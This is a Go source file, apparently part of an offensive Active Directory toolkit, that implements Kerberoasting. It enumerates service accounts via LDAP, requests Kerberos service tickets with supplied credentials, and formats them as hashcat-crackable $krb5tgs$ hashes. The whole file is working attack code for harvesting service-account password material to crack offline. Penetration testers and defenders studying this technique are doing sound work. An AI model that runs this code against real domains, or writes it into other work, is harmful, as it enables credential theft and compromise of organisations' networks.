package kerberos

import (
	"encoding/hex"
	"fmt"

	mtkrb "github.com/TheManticoreProject/Manticore/network/kerberos"

	"github.com/0xbbuddha/GoFenrir/protocols/ldap"
)

type KerberoastableEntry struct {
	SAMAccountName string
	DN             string
	SPNs           []string
}

type KerberoastHash struct {
	Username string
	SPN      string
	Hash     string
}

func EnumKerberoastable(s *ldap.Session) ([]KerberoastableEntry, error) {
	entries, err := s.LdapSession.QueryWholeSubtree(
		"",
		"(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*)(!sAMAccountName=krbtgt))",
		[]string{"sAMAccountName", "distinguishedName", "servicePrincipalName"},
	)
	if err != nil {
		return nil, fmt.Errorf("failed to enumerate kerberoastable accounts: %w", err)
	}

	var results []KerberoastableEntry
	for _, entry := range entries {
		results = append(results, KerberoastableEntry{
			SAMAccountName: entry.GetAttributeValue("sAMAccountName"),
			DN:             entry.GetAttributeValue("distinguishedName"),
			SPNs:           entry.GetAttributeValues("servicePrincipalName"),
		})
	}
	return results, nil
}

// KerberoastActive requests a TGS for each kerberoastable account using the
// attacker's credentials and returns hashcat-crackable hashes ($krb5tgs$).
// Requires a password (not usable with NT hash only).
func KerberoastActive(entries []KerberoastableEntry, username, password, realm, kdcHost string) ([]KerberoastHash, error) {
	if password == "" {
		return nil, fmt.Errorf("kerberoast: password required (PTH not supported for TGS requests)")
	}
	if len(entries) == 0 {
		return nil, nil
	}

	client := mtkrb.NewClient(username, realm, kdcHost).WithPassword(password)
	if err := client.GetTGT(); err != nil {
		return nil, fmt.Errorf("kerberoast: GetTGT failed: %w", err)
	}
	defer client.Destroy()

	var results []KerberoastHash
	for _, e := range entries {
		for _, spn := range e.SPNs {
			ticket, _, err := client.GetTGS(spn, false)
			if err != nil {
				continue
			}
			hash := formatTGSHash(e.SAMAccountName, realm, spn, ticket.EncPart.EType, ticket.EncPart.Cipher)
			if hash != "" {
				results = append(results, KerberoastHash{
					Username: e.SAMAccountName,
					SPN:      spn,
					Hash:     hash,
				})
			}
			break // one ticket per account is enough
		}
	}
	return results, nil
}

// formatTGSHash formats a TGS ticket as a hashcat $krb5tgs$ hash.
// Split: first 16 bytes = checksum, remainder = encrypted data.
func formatTGSHash(username, realm, spn string, etype int, cipher []byte) string {
	if len(cipher) < 17 {
		return ""
	}
	checksum := hex.EncodeToString(cipher[:16])
	data := hex.EncodeToString(cipher[16:])
	// Format: hashcat 7.x uses $ as internal separator inside *...*
	return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s",
		etype, username, realm, spn, checksum, data)
}
